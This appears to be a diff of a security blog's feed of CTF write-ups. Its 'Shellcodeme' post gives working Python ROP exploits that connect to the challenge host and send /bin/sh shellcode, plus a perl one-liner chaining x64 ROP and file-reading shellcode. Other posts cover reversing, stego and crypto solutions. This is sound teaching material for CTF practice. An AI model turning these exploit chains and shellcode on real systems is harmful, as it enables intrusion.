-<p>Grepping the files for &lsquo;flag&rsquo; only returned a string id starting with &ldquo;0x7f0..&rdquo; but this was of no use. I started looking at each file, but one stuck out:</p>
-
-<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~/tmp/apktool1.5.2/rev200/smali/ctf/crackme<span class="nv">$ </span>cat FlagActivity.smali</code></pre></div></p>
-
-<p><div class="highlight"><pre><code class="language-java" data-lang="java"><span class="o">.</span><span class="na">class</span> <span class="kd">public</span> <span class="n">Lctf</span><span class="o">/</span><span class="n">crackme</span><span class="o">/</span><span class="n">FlagActivity</span><span class="o">;</span>
-<span class="o">.</span><span class="na">super</span> <span class="n">Landroid</span><span class="o">/</span><span class="n">app</span><span class="o">/</span><span class="n">Activity</span><span class="o">;</span>
-<span class="o">.</span><span class="na">source</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="o">;</span><span class="n">FlagActivity</span><span class="o">.</span><span class="na">java</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="o">;&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;&amp;</span><span class="n">hellip</span><span class="o">;</span><span class="n">snip</span><span class="o">&amp;</span><span class="n">hellip</span><span class="o">;&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-
-<span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;.</span><span class="na">line</span> <span class="mi">20</span>
-<span class="o">.</span><span class="na">end</span> <span class="n">local</span> <span class="n">v2</span>           <span class="err">#</span><span class="nl">flagText:</span><span class="n">Landroid</span><span class="o">/</span><span class="n">widget</span><span class="o">/</span><span class="n">TextView</span><span class="o">;</span>
-<span class="o">:</span><span class="n">cond_0</span>
-<span class="n">aget</span> <span class="n">v4</span><span class="o">,</span> <span class="n">v0</span><span class="o">,</span> <span class="n">v3</span>
-
-<span class="kt">int</span><span class="o">-</span><span class="n">to</span><span class="o">-</span><span class="kt">char</span> <span class="n">v4</span><span class="o">,</span> <span class="n">v4</span>
-
-<span class="n">invoke</span><span class="o">-</span><span class="kd">static</span> <span class="o">{</span><span class="n">v4</span><span class="o">},</span> <span class="n">Ljava</span><span class="o">/</span><span class="n">lang</span><span class="o">/</span><span class="n">String</span><span class="o">;-&amp;</span><span class="n">gt</span><span class="o">;</span><span class="n">valueOf</span><span class="o">(</span><span class="n">C</span><span class="o">)</span><span class="n">Ljava</span><span class="o">/</span><span class="n">lang</span><span class="o">/</span><span class="n">String</span><span class="o">;</span>
+<p>It didn&rsquo;t take me long to realize we&rsquo;re looking at prime numbers here. This binary bruteforces prime numbers and prints out the prime number when the comparison at <code>0x400708</code> is true. <code>eax</code> contains the ordinal number of the last prime found and is compared to <code>0x989680</code>. That would be 10,000,000 in decimal. I quickly located a list of <a href="https://primes.utm.edu/lists/small/millions/">prime numbers</a> and found the 10th million: 179,424,673.</p>
 
-<span class="n">move</span><span class="o">-</span><span class="n">result</span><span class="o">-</span><span class="n">object</span> <span class="n">v4</span>
+<p>Therefore, the flag was: <code>ADCTF_179424673</code>.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Advent CTF 2014 - Shellcodeme]]></title>
+    <link href="http://barrebas.github.io/blog/2014/12/24/advent-ctf-2014-shellcodeme/"/>
+    <updated>2014-12-24T11:37:46+01:00</updated>
+    <id>http://barrebas.github.io/blog/2014/12/24/advent-ctf-2014-shellcodeme</id>
+    <content type="html"><![CDATA[<p>Why o why do we take part in these painful exercises? Again, <code>shellcodeme</code> seemed like such a simple task. But looks, like all the other challenges of Advent CTF 2014, can be deceiving!</p>
+
+<!-- more -->
+
+
+<p></p>
+
+<p>We&rsquo;re given a binary and the C source code:</p>
+
+<pre><code class="c">/* gcc -m32 -fno-stack-protector -znoexecstack -o shellcodeme shellcodeme.c */
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;sys/mman.h&gt;
+
+#define SHELLCODE_LEN 1024
+
+int main(void) {
+    char *buf;
+    buf = mmap((void *)0x20000000, SHELLCODE_LEN, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
+    read(0, &amp;buf, SHELLCODE_LEN);
+    mprotect((void *)0x20000000, SHELLCODE_LEN, PROT_READ); // no no no~
+    (*(void(*)()) buf)(); // SEGV! no exec. can you execute shellcode?
+}
+</code></pre>
+
+<p>The bug was kind of obvious:</p>
+
+<pre><code class="c">read(0, &amp;buf, SHELLCODE_LEN); // read to the location of buf itself
+</code></pre>
+
+<p>The code will read in the shellcode at <code>&amp;buf</code>, not <code>buf</code>. This will allow us to overwrite that pointer and take control of execution at this line of code:</p>
+
+<pre><code class="c">(*(void(*)()) buf)(); // SEGV! no exec. can you execute shellcode?
+</code></pre>
 
-<span class="n">invoke</span><span class="o">-</span><span class="n">virtual</span> <span class="o">{</span><span class="n">v1</span><span class="o">,</span> <span class="n">v4</span><span class="o">},</span> <span class="n">Ljava</span><span class="o">/</span><span class="n">lang</span><span class="o">/</span><span class="n">String</span><span class="o">;-&amp;</span><span class="n">gt</span><span class="o">;</span><span class="n">concat</span><span class="o">(</span><span class="n">Ljava</span><span class="o">/</span><span class="n">lang</span><span class="o">/</span><span class="n">String</span><span class="o">;)</span><span class="n">Ljava</span><span class="o">/</span><span class="n">lang</span><span class="o">/</span><span class="n">String</span><span class="o">;</span>
+<p>I chose to overwrite the <code>buf</code> pointer with <code>0x080484fc</code>, which is <code>leave; ret</code>. This will restore the stack and land us in my ROP chain. The basic idea is to re-use <code>mprotect</code> and <code>read</code> to read in the shellcode and then return to it. The following python code did just that, landing me a shell on the box:</p>
+
+<pre><code class="python">#!/usr/bin/python
+import struct
+import socket
+import telnetlib
+import time
+
+def p(x):
+        return struct.pack('&lt;L', x)
+
+POP3RET = 0x804855d
+MPROTECT = 0x8048330
+READ = 0x8048340
+
+payload = ""
+payload += p(0x080484fc)        # leave; ret (restore stack)
+payload += "A"*12               # dummy 
+
+payload += p(MPROTECT)          # mprotect shellcode area back to rwx
+payload += p(POP3RET)           # fix stack
+payload += p(0x20000000)        # addr of shellcode
+payload += p(0x1000)            # size (page-aligned)
+payload += p(0x7)               # PROT_READ|PROT_EXEC|PROT_WRITE
+
+payload += p(READ)              # read in our shellcode
+payload += p(POP3RET)           # fix stack
+payload += p(0x0)               # stdin
+payload += p(0x20000000)        # address
+payload += p(1024)              # copied value
+
+payload += p(0x20000000)        # return to shellcode
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('pwnable.katsudon.org', 33201))
+
+# send first stage
+s.send(payload)
+
+# for some reason, this delay was necessary
+time.sleep(0.05)
+
+# send shellcode, spawns /bin/sh
+s.send("\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68")
+
+t = telnetlib.Telnet()
+t.sock = s
+t.interact()
+</code></pre>
+
+<p>I thought I was home-free! Let&rsquo;s cat that flag and be done with it! But what&rsquo;s this? (Yes, I&rsquo;ve started using kali! =))</p>
+
+<pre><code class="bash">root@kali:~# python exploit.py
+id
+uid=1000(shellcodeme) gid=1000(shellcodeme) groups=1000(shellcodeme)
+ls -alh
+total 36K
+dr-xr-xr-x 2 root shellcodeme2 4.0K Dec 22 22:09 .
+drwxr-xr-x 3 root root         4.0K Dec 22 22:09 ..
+-rw-r--r-- 1 root shellcodeme2  220 Sep 26 04:49 .bash_logout
+-rw-r--r-- 1 root shellcodeme2 3.4K Sep 26 04:49 .bashrc
+-rw-r--r-- 1 root shellcodeme2  675 Sep 26 04:49 .profile
+-r--r----- 1 root shellcodeme2   34 Dec 22 22:09 flag
+-r-xr-sr-x 1 root shellcodeme2 8.5K Dec 22 22:09 shellcodeme2
+cat flag 2&gt;&amp;1
+cat: flag: Permission denied
+</code></pre>
+
+<p>Gah! We need to exploit another binary! This one is the same C code, but compiled as x64 code&hellip; I transferred the binary over to my box and started poking it.</p>
+
+<p>The basic solution stays the same: mprotect, read, shellcode, flag. The problem with x64 is that we cannot pass the arguments to calls on the stack: that goes via registers. The two functions I needed are here:</p>
+
+<pre><code class="bash">   0x00000000004005f2 &lt;+53&gt;:    mov    edx,0x400
+   0x00000000004005f7 &lt;+58&gt;:    mov    rsi,rax
+   0x00000000004005fa &lt;+61&gt;:    mov    edi,0x0
+   0x00000000004005ff &lt;+66&gt;:    mov    eax,0x0
+   0x0000000000400604 &lt;+71&gt;:    call   0x400490 &lt;read@plt&gt;
+   0x0000000000400609 &lt;+76&gt;:    mov    edx,0x1
+   0x000000000040060e &lt;+81&gt;:    mov    esi,0x400
+   0x0000000000400613 &lt;+86&gt;:    mov    edi,0x20000000
+   0x0000000000400618 &lt;+91&gt;:    call   0x4004c0 &lt;mprotect@plt&gt;
+</code></pre>
+
+<p>I uploaded the binary to <a href="https://ropshell.com">ropshell.com</a> and analyzed it to find the gadgets I&rsquo;d need. I found <code>esi/rsi</code> and <code>edi/rdi</code> quickly, but <code>edx/rdx</code> was nowhere to be found. Finally, I located these two gadgets:</p>
+
+<pre><code>0x0040068a : pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
+0x00400671 : mov edx, ebp; mov rsi, r14; mov edi, r15d; call [r12 + rbx*8]
+</code></pre>
+
+<p>Prepare for some mind-bending ROP chains&hellip;</p>
+
+<pre><code class="python">#!/usr/bin/python
+
+import struct
+def p(x):
+    return struct.pack("L", x)
+
+payload = ""
+
+'''
+   #0x0040068a : pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
+   #0x00400671 : mov edx, ebp; mov rsi, r14; mov edi, r15d; call [r12 + rbx*8]
+'''
+
+# first, fix up stack   
+payload += p(0x00400690)    # pop pop ret
+payload += p(0x0)
+payload += p(0x0)
+
+#### MPROTECT
+# gadgets to set edi, esi and edx and call mprotect
+payload += p(0x0040068a)    # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
+payload += p(0x6)           # rbx   &lt;&lt; needs to be ebp-1 for code path!
+payload += p(0x7)           # rbp -&gt; edx = mprotect.mask
+payload += p(0x00601038-6*8)    # r12 -&gt; mprotect@got.plt
+payload += p(0x0)           # r13
+payload += p(0x400)         # r14 -&gt; rsi -&gt; esi = mprotect.len
+payload += p(0x20000000)    # r15 -&gt; rdi -&gt; edi = mprotect.addr
+
+payload += p(0x00400671)    #mov edx, ebp; mov rsi, r14; mov edi, r15d; call [r12 + rbx*8]
+payload += "B"*(200-144)    # spacer
+
+#### READ
+# gadgets to set edi, esi and edx and call read
+'''
+   0x00000000004005f2 &lt;+53&gt;:    mov    edx,0x400
+   0x00000000004005f7 &lt;+58&gt;:    mov    rsi,rax
+   0x00000000004005fa &lt;+61&gt;:    mov    edi,0x0
+   0x00000000004005ff &lt;+66&gt;:    mov    eax,0x0
+   0x0000000000400604 &lt;+71&gt;:    call   0x400490 &lt;read@plt&gt;
+'''
+# 0x601020 &lt;read@got.plt&gt;
+payload += p(0x0040068a)    # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
+payload += p(0x400-1)       # rbx   &lt;&lt; needs to be ebp-1 for code path!
+payload += p(0x400)         # rbp -&gt; edx = 0x400
+payload += p(0x601020-0x3ff*8)  # r12 -&gt; read@got.plt
+payload += p(0x0)           # r13 
+payload += p(0x20000000)    # r14 -&gt; rsi -&gt; esi = read.addr
+payload += p(0x0)           # r15 -&gt; rdi -&gt; edi = 0?
+                            # lucky for me, rax = 0
+payload += p(0x00400671)    #mov edx, ebp; mov rsi, r14; mov edi, r15d; call [r12 + rbx*8]
+payload += "B"*(200-144)    # spacer
+
+# return to shellcode!
+payload += p(0x20000000)
+
+print payload
+</code></pre>
+
+<p>One of the tricky things with the mprotect and read ROP chains is the following. The code at <code>0x400671</code>, which I use to set <code>edx</code>, looks like this:</p>
+
+<pre><code>   0x400671 &lt;__libc_csu_init+65&gt;:   mov    edx,ebp
+   0x400673 &lt;__libc_csu_init+67&gt;:   mov    rsi,r14
+   0x400676 &lt;__libc_csu_init+70&gt;:   mov    edi,r15d
+   0x400679 &lt;__libc_csu_init+73&gt;:   call   QWORD PTR [r12+rbx*8]
+   0x40067d &lt;__libc_csu_init+77&gt;:   add    rbx,0x1
+   0x400681 &lt;__libc_csu_init+81&gt;:   cmp    rbx,rbp  
+   0x400684 &lt;__libc_csu_init+84&gt;:   jne    0x400670 &lt;__libc_csu_init+64&gt;
+   0x400686 &lt;__libc_csu_init+86&gt;:   add    rsp,0x8
+   0x40068a &lt;__libc_csu_init+90&gt;:   pop    rbx
+   0x40068b &lt;__libc_csu_init+91&gt;:   pop    rbp
+   0x40068c &lt;__libc_csu_init+92&gt;:   pop    r12
+   0x40068e &lt;__libc_csu_init+94&gt;:   pop    r13
+   0x400690 &lt;__libc_csu_init+96&gt;:   pop    r14
+   0x400692 &lt;__libc_csu_init+98&gt;:   pop    r15
+   0x400694 &lt;__libc_csu_init+100&gt;:  ret    
+</code></pre>
+
+<p>First <code>ebp</code> is copied to <code>edx</code>. Then <code>rsi</code> and <code>edi</code> are set. Then we call the QWORD pointer at a memory address referenced by <code>esi</code> and <code>ebx</code>. I chose to <code>esi</code> and <code>ebx</code> such that they point to the got pointer of mprotect.</p>
+
+<p>The problem arises after returning from the mprotect call:</p>
+
+<pre><code class="bash">   0x40067d &lt;__libc_csu_init+77&gt;:   add    rbx,0x1
+   0x400681 &lt;__libc_csu_init+81&gt;:   cmp    rbx,rbp
+   0x400684 &lt;__libc_csu_init+84&gt;:   jne    0x400670 &lt;__libc_csu_init+64&gt;
+</code></pre>
+
+<p>So I needed to make sure that <code>rbx</code> and <code>rbp</code> were equal, otherwise the code jumps away and I inevitably got a crash. I solved that problem by setting <code>rbx</code> to <code>rbp-1</code>. Only thing left was to adjust <code>esi</code> and away we go! With the problem of setting <code>edx</code> out of the way, I could call mprotect to set <code>0x20000000</code> to rwx and read in the shellcode. This needed to be run from the shell that I obtained from exploiting the first binary.</p>
+
+<p>I sprinkled in some <a href="http://www.shell-storm.org/shellcode/files/shellcode-878.php">shellcode magic</a> and was able to exploit the binary locally!</p>
+
+<p>Remotely, I ran into a problem: I could not make files on the remote system, nor was python installed. I rewrote the exploit to dump the shellcode as printable bytes:</p>
+
+<pre><code class="python">shellcode = payload.encode('hex')
+
+output = ""
+
+for i in range(len(shellcode)/2):
+    output += "\\x" +shellcode[i*2:i*2+2]
+
+print output
+</code></pre>
+
+<p>I tried to run the exploit and shellcode using various combinations of echo and printf (also after spawning /bin/bash) but nothing seemed to work. It seemed the exploit didn&rsquo;t work with those two bash builtins, while it did with python. I looked for a replacement and lo and behold: perl was installed on the remote box! I rewrote the exploit to read <code>flag</code> instead of <code>/etc/passwd</code>. For this, I had to adjust the offset:</p>
+
+<pre><code>xor byte [rdi + 11], 0x41
+--&gt;
+xor byte [rdi + 4], 0x41
+</code></pre>
+
+<p>And <strong>finally</strong>, starting from the first binary:</p>
+
+<pre><code class="bash">root@kali:~# python exploit.py
+id
+uid=1000(shellcodeme) gid=1000(shellcodeme) groups=1000(shellcodeme)
+(perl -e 'print "\x90\x06\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x8a\x06\x40\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00\x08\x10\x60\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\x00\x00\x00\x00\x71\x06\x40\x00\x00\x00\x00\x00\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x8a\x06\x40\x00\x00\x00\x00\x00\xff\x03\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x28\xf0\x5f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x71\x06\x40\x00\x00\x00\x00\x00\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x00\x00\x00\x20\x00\x00\x00\x00"'; perl -e 'print "\xeb\x3f\x5f\x80\x77\x04\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xffflag\x41"') | ./shellcodeme2
+ADCTF_I_l0v3_tH15_4W350M3_m15T4K
+</code></pre>
+
+<p>This one was tough, but a fun one nonetheless! ROP all the things! =)</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Advent CTF 2014 - Rotate]]></title>
+    <link href="http://barrebas.github.io/blog/2014/12/21/advent-ctf-2014-rotate/"/>
+    <updated>2014-12-21T16:09:36+01:00</updated>
+    <id>http://barrebas.github.io/blog/2014/12/21/advent-ctf-2014-rotate</id>
+    <content type="html"><![CDATA[<p>A crypto challenge! We&rsquo;re given a zip-file, containing <code>flag.jpg.enc</code> and <code>rotate.py</code>.</p>
+
+<!-- more -->
+
+
+<p><code>rotate.py</code> handles the encryption, but only does so one way:</p>
+
+<pre><code class="python">import sys
+import math
+import struct
+
+p = lambda x: struct.pack('f', x)
+u = lambda x: struct.unpack('b', x)[0]
 
-<span class="n">move</span><span class="o">-</span><span class="n">result</span><span class="o">-</span><span class="n">object</span> <span class="n">v1</span>
+if len(sys.argv) != 3:
+    sys.exit(1)
 
-<span class="o">.</span><span class="na">line</span> <span class="mi">19</span>
-<span class="n">add</span><span class="o">-</span><span class="kt">int</span><span class="o">/</span><span class="n">lit8</span> <span class="n">v3</span><span class="o">,</span> <span class="n">v3</span><span class="o">,</span> <span class="mh">0x1</span>
-
-<span class="k">goto</span> <span class="o">:</span><span class="n">goto_0</span>
-
-<span class="o">.</span><span class="na">line</span> <span class="mi">17</span>
-<span class="n">nop</span>
-
-<span class="o">:</span><span class="n">array_0</span>
-<span class="o">.</span><span class="na">array</span><span class="o">-</span><span class="n">data</span> <span class="mh">0x4</span> 
-    <span class="mh">0x66</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> 
-    <span class="mh">0x6c</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> 
-    <span class="mh">0x61</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> 
-    <span class="mh">0x67</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> 
-    <span class="mh">0x7b</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> 
-    <span class="mh">0x77</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> 
-    <span class="mh">0x34</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> 
-    <span class="mh">0x6e</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> 
-    <span class="mh">0x6e</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> 
-    <span class="mh">0x34</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> 
-    <span class="mh">0x5f</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> 
-    <span class="mh">0x6a</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> 
-    <span class="mh">0x34</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> 
-    <span class="mh">0x72</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> 
-    <span class="mh">0x5f</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> 
-    <span class="mh">0x6d</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> 
-    <span class="mh">0x79</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> 
-    <span class="mh">0x5f</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> 
-    <span class="mh">0x64</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> 
-    <span class="mh">0x33</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> 
-    <span class="mh">0x78</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> 
-    <span class="mh">0x7d</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> 
-<span class="o">.</span><span class="na">end</span> <span class="n">array</span><span class="o">-</span><span class="n">data</span>
-<span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
-
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;.</span><span class="na">end</span> <span class="n">method</span></code></pre></div></p>
-
-<p><code>flag{w4nn4_j4r_my_d3x}</code></p>
-
-<h1>rev300 &ldquo;elrond32&rdquo;</h1>
-
-<p>The challenge name was a big hint. Apparently, &lsquo;Elrond&rsquo; is linked to Lord of the Rings. The zip file contains a Linux ELF binary. Upon running the binary, all I got was <code>Access Denied</code>. Disassembling in <code>gdb</code> and analysis showed that the program takes exactly one argument. The length of this string must be exactly 8, no more, no less. The program then starts to compare the values of each byte. It jumps to the relative sections of code using a jumptable. I first did:</p>
-
-<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~/tmp<span class="nv">$ </span>objdump -d rev300 <span class="p">|</span>grep <span class="p">&amp;</span>ldquo<span class="p">;</span>cmp <span class="p">&amp;</span>rdquo<span class="p">;</span>       &lt;br/&gt;
- 80483b6:   <span class="m">39</span> d8                   cmp    %ebx,%eax
- 80483d4:   <span class="m">39</span> d8                   cmp    %ebx,%eax
- 8048439:   3c 6e                   cmp    <span class="nv">$0x6e</span>,%al
- 8048451:   3c <span class="m">72</span>                   cmp    <span class="nv">$0x72</span>,%al
- 8048469:   3c <span class="m">64</span>                   cmp    <span class="nv">$0x64</span>,%al
- 804847d:   3c <span class="m">65</span>                   cmp    <span class="nv">$0x65</span>,%al
- 8048491:   3c <span class="m">69</span>                   cmp    <span class="nv">$0x69</span>,%al
- 80484a5:   3c <span class="m">61</span>                   cmp    <span class="nv">$0x61</span>,%al
- 80484b9:   3c <span class="m">67</span>                   cmp    <span class="nv">$0x67</span>,%al
- 80484ca:   3c <span class="m">73</span>                   cmp    <span class="nv">$0x73</span>,%al
- 8048675:   <span class="m">39</span> fe                   cmp    %edi,%esi
- 80486ac:   <span class="m">83</span> f8 ff                cmp    <span class="nv">$0xffffffff</span>,%eax
- 80486bf:   <span class="m">83</span> f8 ff                cmp    <span class="nv">$0xffffffff</span>,%eax</code></pre></div></p>
-
-<p>This already narrowed down the possible values for each byte quite a lot! Apparently, the program checks for the byte values &ldquo;sgnrdeia&rdquo;. I looked up the jumptable and started debugging the program.</p>
-
-<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">gdb-peda<span class="nv">$ </span>x/8x 0x8048720
-0x8048720:  0x0804848b  0x08048477  0x080484d5  0x08048433
-0x8048730:  0x08048463  0x0804849f  0x080484b3  0x080484c4</code></pre></div></p>
-
-<p>When I was writing down the values the program was checking against, I was making a mistake and wrote down &lsquo;in.n&rsquo;. I looked at the rest of the letters and for some reason it clicked. I got lucky!</p>
-
-<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~/tmp<span class="nv">$ </span>./rev300 isengard
-Access granted</code></pre></div>
-<code>flag{s0me7hing_S0me7hinG_t0lki3n}</code></p>
-
-<h1>stego100</h1>
-
-<p>Stego can be extremely hard but also quite fun once you &lsquo;get&rsquo; it. The zip file contained a PNG image showing the three vikings from The Lost Vikings. I did not notice any strange artifacts in the image so I ran <code>strings</code> on the image just to be sure.</p>
-
-<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~/tmp<span class="nv">$ </span>strings stego100
-LdfO<span class="p">;</span>&lt;/p&gt;
-
-&lt;h1&gt;tEXthint&lt;/h1&gt;
-
-&lt;p&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://i.imgur.com/22kUrzm.png&quot;</span>&gt;http://i.imgur.com/22kUrzm.png&lt;/a&gt;
-IEND</code></pre></div></p>
-
-<p>Hmm. Another PNG? It looked like the exact same image, but the file sizes differed. I tried to subtract the second image from the first in GIMP but that didn&rsquo;t work. I spent quite some time on it and I finally got it using <code>imagemagick</code>:</p>
-
-<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">compare 22kUrzm.png stego100 diff.png</code></pre></div></p>
-
-<p>This created a difference file from both PNGs. This file had a very obvious QR code:</p>
-
-<p><img src="/assets/stego100-diff.png" alt="" /></p>
-
-<p>Scanning this QR code with a smartphone yielded <code>flag{#justdiffit}</code></p>
-
-<h1>cry100</h1>
-
-<p>The first and easiest crypto challenge. The zip file contained a text file with the following content:</p>
-
-<p><div class="highlight"><pre><code class="language-text" data-lang="text">XMVZGC RGC AMG RVMG HGFGMQYCD VT VWM BYNO, NSVWDS NSGO RAO XG UWFN AF
-HACDGMVWF. AIRVFN AII AMG JVRRVC-XVMC, FYRBIG TVIZ ESV SAH CGQGM XGGC
-RVMG NSAC A RYIG TMVR NSG SVWFG ESGMG NSGO EGMG XVMC WCNYI NSG HAO
-FVRG IVMH JARG MVWCH NV NAZG NSGR VTT NV EAM. OVWM TIAD YF &amp;ldquo;CV NSYF
-YF CVN JMOBNV RO HGAM&amp;rdquo;, YC IVEGMJAFG, EYNS WCHGMFJVMGF YCFNGAH VT
-FBAJGF, FWMMVWCHGH XO NSG WFWAI &amp;ldquo;TIAD&amp;rdquo; NAD ACH JWMIO XMAJGF. GCUVO.</code></pre></div></p>
-
-<p>This looked like either a Caesar cipher or a substitution cipher. Luckily, <a href="http://quipqiup.com/index.php">online solvers</a> exist.</p>
-
-<p><div class="highlight"><pre><code class="language-text" data-lang="text">BROKEN MEN ARE MORE DESERVING OF OUR PITY, THOUGH THEY MAY BE JUST AS  DANGEROUS. ALMOST ALL ARE COMMON-BORN, SIMPLE FOLK WHO HAD NEVER BEEN  MORE THAN A MILE FROM THE HOUSE WHERE THEY WERE BORN UNTIL THE DAY  SOME LORD CAME ROUND TO TAKE THEM OFF TO WAR. YOUR FLAG IS &amp;lsquo;NO THIS  IS NOT CRYPTO MY DEAR&amp;rsquo;, IN LOWERCASE, WITH UNDERSCORES INSTEAD OF  SPACES, SURROUNDED BY THE USUAL &amp;lsquo;FLAG&amp;rsquo; TAG AND CURLY BRACES. ENJOY.</code></pre></div></p>
-
-<p><code>flag{no_this_is_not_crypto_my_dear}</code></p>
-
-<h1>cry300</h1>
-
-<p>A fun one! I read PoC||GTFO a lot, and the name of the challenge and the file screamed <code>electronic coloring book</code>. For more info, grab a copy of PoC||GTFO 0x05 from a neighbourly neighbour. The idea is that the image file, a 4k still, is encrypted with ECB, but this block cipher is very bad a encrypting. Repeated blocks can be &lsquo;colored&rsquo; in using <a href="https://github.com/doegox/ElectronicColoringBook/blob/master/ElectronicColoringBook.py">this script</a>.</p>
-
